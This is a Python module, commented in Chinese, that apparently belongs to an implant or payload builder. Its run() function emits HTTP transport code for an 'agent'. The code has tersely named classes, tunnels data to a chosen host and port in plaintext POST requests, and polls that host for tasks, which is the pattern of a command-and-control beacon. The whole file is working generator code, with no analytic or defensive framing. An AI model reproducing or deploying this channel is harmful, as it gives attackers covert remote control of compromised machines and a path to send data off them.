"""
@module: transport_http
@desc: 生成 HTTP 传输实现代码(纯明文 POST 隧道, 无 TLS; 载荷连 agent_http 前置)
@params: host port key_hex [domain]
"""
MODULE = {
    "desc": "生成 HTTP 传输实现代码(POST 明文隧道)",
    "params": [
        ("host", "必填，agent 地址"),
        ("port", "必填，agent HTTP 监听端口"),
        ("key_hex", "必填，agent_key"),
    ],
}


def run(host, port, key_hex):
    """生成 _nT() 实现：HttpSocket（sendall 缓存 → POST → recv 缓存响应）。

    与 transport_https 同构，仅无 TLS（http:// + urlopen 不带 ssl ctx）。
    _HS 每次 recv 首字节时发一次 POST（body=缓存帧），响应缓存供
    后续 recv 读取；空缓存 POST 即轮询取任务。
    """
    host = str(host)
    port = int(port)

    code = f'''\
import urllib.request as _ur
class _HS:
    def __init__(s, h, p):
        s._h, s._p = h, p
        s._buf = b""
        s._resp = b""
        s._bid = ""
    def settimeout(s, t):
        pass
    def sendall(s, data):
        s._buf += data
        s._resp = b""
    def recv(s, n):
        if not s._resp:
            s._resp = s._post()
        out, s._resp = s._resp[:n], s._resp[n:]
        return out
    def _post(s):
        url = f"http://{{s._h}}:{{s._p}}/poll/{{s._bid}}"
        req = _ur.Request(url, data=s._buf, method="POST")
        s._buf = b""
        with _ur.urlopen(req, timeout=30) as r:
            return r.read()
    def close(s):
        pass
def _nT():
    s = _HS({host!r}, {port})
    s._bid = _D
    return s
'''
    return code


if __name__ == "__main__":
    print(run("127.0.0.1", 8080, "ab" * 32))
